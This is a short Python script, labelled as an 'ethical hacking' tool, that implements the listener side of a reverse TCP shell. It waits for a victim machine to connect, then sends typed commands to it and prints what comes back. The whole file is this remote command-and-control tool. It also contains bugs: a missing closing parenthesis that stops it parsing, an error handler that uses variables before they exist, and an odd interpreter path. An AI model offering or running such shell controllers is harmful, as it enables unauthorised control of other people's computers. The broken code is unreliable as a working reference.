#!/usr/lib/python3.6
import socket
import sys
import optparse

'''
This Script was Written by Ariel Weiser and intend for ethical hacking purposes only.
Written in: July 2018.  
'''
# Create socket (allows two computers to connect)
def socket_create():

    try:
        # Creating Socket instance with IPV4 & TCP attributes
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("[-]Socket creation error: " + str(msg))
        sys.exit(0)
    print("[+] Socket created successfully")
    return s


# Bind socket to port (the host and port the communication will take place) and wait for connection from client
# S.listen  = 5 connections are allow for server simultaneously
def socket_bind(s, host, port):

    try:
        print("[+]Binding socket to port: " + str(port))
        s.bind((host, int(port)))
        s.listen(5)
    except socket.error as msg:
        print("[-]Socket binding error: " + str(msg) + "\n" + "Retrying..."
    print("[+] Socket bind Successfully to " + str(host) + ":" + str(port) )


# Establish connection with client (socket must be listening for them)
def socket_accept(s):
    try:
        conn, address = s.accept()

    except Exception as ex:
        print("[-]couldn't accept connect with "+ str(address[0]) + "\n" + str(ex))
        conn.close()
        s.close()
        sys.exit(0)
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    return conn

# Send commands
def send_commands(conn , s ):
    while True:
        cmd = input("Shell>>")
        try:
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            if len(str.encode(cmd)) > 0:
                # Converting cmd from 'Byte' to 'String' and send it for client
                conn.send(str.encode(cmd))
                # Receiving output from client in 'Byte' and converting it for string in utf-8 format
                bytes_str = conn.recv(1024)
                client_response = bytes_str.decode('utf-8')
                print(client_response)
        except KeyboardInterrupt as k:
            s.close()
            conn.close()
            print(str(k))
            sys.exit(0)


def main():

    #receving host_ip/port to start connection.
    parser = optparse.OptionParser(usage="usage: ./Reverse_TCP_Server [options] arg")
    parser.add_option("-i",  dest="hostname", type="string", help="host ip for tcp server",)
    parser.add_option("-p", dest="port", help="port number for tcp connection")

    (options, args) = parser.parse_args()
    if ((options.hostname is None) | (options.port is None)):
        print("[-]Missing Arguments for script...")
        parser.print_help()
        sys.exit(0)
    else:
        lhost = options.hostname
        lport = options.port



    s = socket_create()
    socket_bind(s, lhost, lport)
    conn = socket_accept(s)
    send_commands(conn, s )

#Calling Main function
main()